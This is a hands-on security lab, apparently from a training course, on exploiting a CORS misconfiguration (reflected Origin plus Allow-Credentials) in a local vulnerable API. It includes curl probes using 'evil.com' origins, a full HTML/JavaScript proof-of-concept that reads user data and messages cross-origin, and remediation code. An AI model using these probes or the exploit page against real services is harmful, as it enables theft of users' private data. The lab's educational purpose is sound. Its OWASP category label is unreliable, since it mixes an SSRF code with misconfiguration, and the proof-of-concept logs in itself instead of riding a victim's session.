# Lab: CORS Misconfiguration Exploitation

## Objective

Discover and exploit Cross-Origin Resource Sharing (CORS) misconfigurations in the SocialHack API that allow malicious websites to steal authenticated user data. You will verify the misconfiguration, analyze information disclosure via headers, and build a proof-of-concept exploit.

## Metadata

| Field | Value |
|---|---|
| **Difficulty** | Medium |
| **Estimated Time** | 45 minutes |
| **Prerequisites** | Labs 01–04 completed, basic understanding of Same-Origin Policy, HTML/JavaScript knowledge |
| **OWASP API Category** | API7:2023 – Server Side Request Forgery / Security Misconfiguration |

---

## Background

### What Is CORS?

**Cross-Origin Resource Sharing (CORS)** is a browser security mechanism that controls which domains can make requests to your API. It extends the **Same-Origin Policy (SOP)**, which by default prevents JavaScript on one origin from reading responses from a different origin.

### How CORS Works

```
1. Browser on https://evil.com makes request to https://api.example.com
2. Browser adds: Origin: https://evil.com
3. Server responds with: Access-Control-Allow-Origin: https://evil.com
4. If ACAO matches Origin, browser allows JavaScript to read the response
5. If ACAO does NOT match, browser blocks the response from JavaScript
```

### CORS Headers

| Header | Purpose |
|---|---|
| `Access-Control-Allow-Origin` (ACAO) | Which origins can access the resource |
| `Access-Control-Allow-Credentials` | Whether cookies/auth headers are sent |
| `Access-Control-Allow-Methods` | Which HTTP methods are allowed |
| `Access-Control-Allow-Headers` | Which request headers are allowed |
| `Access-Control-Max-Age` | How long preflight results are cached |

### Dangerous CORS Configurations

| Pattern | Risk |
|---|---|
| `ACAO: *` (wildcard) | Any site can read responses (but not with credentials) |
| ACAO reflects `Origin` header | Any site can read responses, including with credentials |
| `ACAO: <reflected>` + `Credentials: true` | **Critical** — Any site can steal authenticated data |
| `ACAO: null` | Sandboxed iframes can access the API |

---

## Lab Environment

| Item | Value |
|---|---|
| Target API | `http://localhost:5001` |
| Vulnerable Behavior | ACAO reflects Origin, Credentials: true |
| Test User | alice / password123 |

---

## Tasks

### Task 1: Test CORS with an Evil Origin

**Goal:** Verify that the API reflects arbitrary Origin headers in its CORS response.

**Steps:**

1. Send a request with a malicious Origin header:

```bash
curl -s -v http://localhost:5001/api/v1/posts \
  -H "Origin: http://evil.com" \
  -H "Authorization: Bearer $(curl -s -X POST http://localhost:5001/api/v1/auth/login \
    -H 'Content-Type: application/json' \
    -d '{"username":"alice","password":"password123"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')" \
  2>&1 | grep -i "access-control\|origin"
```

2. Check the response headers for:
   - `Access-Control-Allow-Origin` — does it reflect `http://evil.com`?
   - `Access-Control-Allow-Credentials` — is it `true`?

3. Try with different origins:

```bash
# Try another evil domain
curl -s -D - http://localhost:5001/api/v1/posts \
  -H "Origin: http://attacker.example.com" \
  -H "Authorization: Bearer $TOKEN" | head -20

# Try a null origin
curl -s -D - http://localhost:5001/api/v1/posts \
  -H "Origin: null" \
  -H "Authorization: Bearer $TOKEN" | head -20
```

> **🚩 FLAG 1:** What is the `Access-Control-Allow-Origin` value when sending `Origin: http://evil.com`?

<details>
<summary>Hint 1 (Gentle Nudge)</summary>
CORS headers are in the HTTP response headers, not the body. Use <code>curl -v</code> or <code>curl -D -</code> to see them.
</details>

<details>
<summary>Hint 2 (Stronger Push)</summary>
A misconfigured API "reflects" whatever Origin value you send. So if you send <code>Origin: http://evil.com</code>, the response should contain <code>Access-Control-Allow-Origin: http://evil.com</code>.
</details>

<details>
<summary>Hint 3 (Almost the Answer)</summary>
The ACAO value is <code>http://evil.com</code> — the API reflects it back. Combined with <code>Access-Control-Allow-Credentials: true</code>, this means any website can steal data from authenticated users.
</details>

---

### Task 2: Check for Credentials Support

**Goal:** Verify that `Access-Control-Allow-Credentials: true` is returned, making the misconfiguration exploitable.

**Steps:**

1. Send a request and check for the credentials header:

```bash
curl -s -D - http://localhost:5001/api/v1/users/1 \
  -H "Origin: http://evil.com" \
  -H "Authorization: Bearer $TOKEN" | grep -i "access-control-allow-credentials"
```

2. Understand why `Allow-Credentials: true` is critical:
   - Without it: Browser won't send cookies/Authorization headers cross-origin
   - With it: Browser WILL include authentication, allowing the attacker to act as the victim

3. Test against a sensitive endpoint:

```bash
curl -s -D - http://localhost:5001/api/v1/export/profile \
  -H "Origin: http://evil.com" \
  -H "Authorization: Bearer $TOKEN" 2>&1 | head -30
```

<details>
<summary>Hint 1</summary>
The <code>Access-Control-Allow-Credentials</code> header will have a value of either <code>true</code> or <code>false</code> (or be absent entirely).
</details>

<details>
<summary>Hint 2</summary>
When <code>Credentials: true</code> is set, the browser includes cookies and auth headers in cross-origin requests. This is what makes CORS reflection exploitable.
</details>

<details>
<summary>Hint 3</summary>
The API returns <code>Access-Control-Allow-Credentials: true</code>. This, combined with Origin reflection, is a critical vulnerability.
</details>

---

### Task 3: Information Disclosure via Headers

**Goal:** Check for server headers that leak technology information.

**Steps:**

1. Examine all response headers:

```bash
curl -s -D - http://localhost:5001/api/v1/posts \
  -H "Authorization: Bearer $TOKEN" | head -20
```

2. Look for these revealing headers:

```bash
curl -s -D - http://localhost:5001/api/v1/posts \
  -H "Authorization: Bearer $TOKEN" 2>&1 | grep -iE "x-powered-by|server|x-framework|x-version"
```

3. The `X-Powered-By` header reveals what framework the API uses, making targeted exploits easier.

> **🚩 FLAG 2:** What is the `X-Powered-By` header value?

<details>
<summary>Hint 1</summary>
Many web frameworks add an <code>X-Powered-By</code> header automatically. Common values include <code>Express</code>, <code>Flask</code>, <code>Django</code>.
</details>

<details>
<summary>Hint 2</summary>
The SocialHack API is built with a Python web framework. Check if the header says something like <code>Flask</code> or <code>Werkzeug</code>.
</details>

<details>
<summary>Hint 3</summary>
The header likely shows <code>X-Powered-By: Flask</code> or <code>X-Powered-By: Express</code>. The exact value depends on the server implementation. Check the response headers.
</details>

---

### Task 4: Test OPTIONS Preflight Requests

**Goal:** Understand how preflight requests work and what the API allows.

**Steps:**

1. Send a preflight OPTIONS request:

```bash
curl -s -v -X OPTIONS http://localhost:5001/api/v1/posts \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: POST" \
  -H "Access-Control-Request-Headers: Content-Type, Authorization" \
  2>&1 | grep -i "access-control"
```

2. Note the response headers:
   - `Access-Control-Allow-Methods` — which methods are allowed?
   - `Access-Control-Allow-Headers` — which headers can be sent?
   - `Access-Control-Max-Age` — how long is the preflight cached?

3. Try requesting a dangerous method in the preflight:

```bash
curl -s -v -X OPTIONS http://localhost:5001/api/v1/admin/users \
  -H "Origin: http://evil.com" \
  -H "Access-Control-Request-Method: DELETE" \
  2>&1 | grep -i "access-control"
```

<details>
<summary>Hint 1</summary>
A preflight request is an OPTIONS request the browser sends before the actual request to check if the cross-origin request is allowed.
</details>

<details>
<summary>Hint 2</summary>
The <code>Access-Control-Allow-Methods</code> header tells you what HTTP methods the API allows from cross-origin requests. A permissive API might allow GET, POST, PUT, DELETE.
</details>

<details>
<summary>Hint 3</summary>
If the API returns <code>Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS</code>, it means cross-origin requests can use any of these methods — very dangerous combined with Origin reflection.
</details>

---

### Task 5: Write a CORS Exploitation Proof-of-Concept

**Goal:** Create an HTML page that demonstrates how a malicious website could steal data from an authenticated user.

**Steps:**

1. Create the following HTML file on your system (e.g., `cors-exploit.html`):

```html
<!DOCTYPE html>
<html>
<head>
    <title>CORS Exploitation PoC</title>
    <style>
        body { font-family: monospace; background: #1a1a2e; color: #0f0; padding: 20px; }
        h1 { color: #e94560; }
        pre { background: #16213e; padding: 15px; border-radius: 5px; overflow-x: auto; }
        .stolen { color: #ff6b6b; font-weight: bold; }
        button { background: #e94560; color: white; border: none; padding: 10px 20px;
                 cursor: pointer; font-size: 16px; margin: 10px 0; }
    </style>
</head>
<body>
    <h1>⚠️ CORS Exploitation PoC — SocialHack API</h1>
    <p>This page demonstrates how a malicious website can steal data from the SocialHack API
       due to CORS misconfiguration (Origin reflection + Allow-Credentials: true).</p>

    <button onclick="stealData()">🔓 Steal User Data</button>
    <button onclick="stealProfile()">📋 Steal Full Profile</button>
    <button onclick="stealMessages()">💬 Steal Messages</button>

    <h2>Stolen Data:</h2>
    <pre id="output">Click a button above to begin the attack...</pre>

    <script>
    const API = "http://localhost:5001/api/v1";

    // NOTE: In a real attack, the victim would already be authenticated
    // via cookies. For this PoC, we first obtain a token.
    let stolenToken = null;

    async function getToken() {
        // In a real scenario, the browser would send cookies automatically.
        // Here we simulate by logging in.
        const resp = await fetch(API + "/auth/login", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({username: "alice", password: "password123"})
        });
        const data = await resp.json();
        stolenToken = data.token;
        return stolenToken;
    }

    async function stealData() {
        const output = document.getElementById("output");
        output.textContent = "Exploiting CORS misconfiguration...\n\n";

        try {
            if (!stolenToken) await getToken();

            const resp = await fetch(API + "/users/1", {
                headers: {"Authorization": "Bearer " + stolenToken}
            });
            const data = await resp.json();

            output.textContent += "=== STOLEN USER DATA ===\n";
            output.textContent += JSON.stringify(data, null, 2);
            output.textContent += "\n\n[!] Data exfiltrated successfully!";
            output.textContent += "\n[!] An attacker would send this to their server.";
        } catch (e) {
            output.textContent += "Error: " + e.message;
        }
    }

    async function stealProfile() {
        const output = document.getElementById("output");
        output.textContent = "Stealing full profile via /export/profile...\n\n";

        try {
            if (!stolenToken) await getToken();

            const resp = await fetch(API + "/export/profile", {
                headers: {"Authorization": "Bearer " + stolenToken}
            });
            const data = await resp.json();

            output.textContent += "=== STOLEN FULL PROFILE (includes password hash!) ===\n";
            output.textContent += JSON.stringify(data, null, 2);
        } catch (e) {
            output.textContent += "Error: " + e.message;
        }
    }

    async function stealMessages() {
        const output = document.getElementById("output");
        output.textContent = "Stealing private messages...\n\n";

        try {
            if (!stolenToken) await getToken();

            for (let i = 1; i <= 5; i++) {
                const resp = await fetch(API + "/messages/" + i, {
                    headers: {"Authorization": "Bearer " + stolenToken}
                });
                if (resp.ok) {
                    const data = await resp.json();
                    output.textContent += `=== Message #${i} ===\n`;
                    output.textContent += JSON.stringify(data, null, 2) + "\n\n";
                }
            }
        } catch (e) {
            output.textContent += "Error: " + e.message;
        }
    }
    </script>
</body>
</html>
```

2. To test the PoC, open the HTML file from a different origin (e.g., using a simple HTTP server):

```bash
# Serve the file on port 8888
python3 -m http.server 8888 --directory /path/to/your/poc/

# Open in browser: http://localhost:8888/cors-exploit.html
# Requests will go cross-origin from port 8888 to port 5001
```

3. Click the buttons and observe how data from the API is accessible to the "evil" website.

> **🚩 FLAG 3:** Successfully create a working CORS exploitation PoC. The PoC should demonstrate data theft from at least one endpoint.

<details>
<summary>Hint 1</summary>
The key to the exploit is that the API reflects any Origin in <code>Access-Control-Allow-Origin</code> and returns <code>Access-Control-Allow-Credentials: true</code>. This means the browser will allow cross-origin JavaScript to read the response.
</details>

<details>
<summary>Hint 2</summary>
Use the <code>fetch()</code> API with <code>credentials: "include"</code> to send cookies cross-origin. For JWT-based auth (like in this lab), the token would need to be in a cookie.
</details>

<details>
<summary>Hint 3</summary>
The PoC HTML above is a complete working example. Serve it on a different port and open it in your browser. The JavaScript will make cross-origin requests to the SocialHack API and display the stolen data.
</details>

---

## Flags Summary

| Flag | Description | Expected Value |
|---|---|---|
| FLAG 1 | ACAO value when Origin is `http://evil.com` | `http://evil.com` (reflected) |
| FLAG 2 | X-Powered-By header value | Check response headers (e.g., `Flask` or `Express`) |
| FLAG 3 | Working CORS exploitation PoC | HTML page that steals API data |

---

## Remediation

### 1. Whitelist Allowed Origins

```python
ALLOWED_ORIGINS = [
    "https://app.socialhack.com",
    "https://admin.socialhack.com"
]

@app.after_request
def add_cors_headers(response):
    origin = request.headers.get("Origin")
    if origin in ALLOWED_ORIGINS:
        response.headers["Access-Control-Allow-Origin"] = origin
        response.headers["Access-Control-Allow-Credentials"] = "true"
    return response
```

### 2. Never Reflect the Origin Header

```python
# VULNERABLE — reflects any origin
response.headers["Access-Control-Allow-Origin"] = request.headers.get("Origin", "*")

# SECURE — explicit whitelist
if origin in ALLOWED_ORIGINS:
    response.headers["Access-Control-Allow-Origin"] = origin
```

### 3. Remove Information-Leaking Headers

```python
@app.after_request
def remove_headers(response):
    response.headers.pop("X-Powered-By", None)
    response.headers.pop("Server", None)
    # Add security headers
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    response.headers["Strict-Transport-Security"] = "max-age=31536000"
    return response
```

### 4. Restrict Allowed Methods and Headers

```python
response.headers["Access-Control-Allow-Methods"] = "GET, POST"  # Only what's needed
response.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization"
response.headers["Access-Control-Max-Age"] = "3600"
```

### 5. Use SameSite Cookies

```python
app.config["SESSION_COOKIE_SAMESITE"] = "Strict"
app.config["SESSION_COOKIE_SECURE"] = True
app.config["SESSION_COOKIE_HTTPONLY"] = True
```

---

## References

- [OWASP CORS Misconfiguration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/07-Testing_Cross_Origin_Resource_Sharing)
- [PortSwigger — CORS](https://portswigger.net/web-security/cors)
- [MDN — Cross-Origin Resource Sharing](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS)
- [CWE-942: Overly Permissive Cross-domain Whitelist](https://cwe.mitre.org/data/definitions/942.html)
- [CORS Misconfiguration Exploitation](https://book.hacktricks.xyz/pentesting-web/cors-bypass)
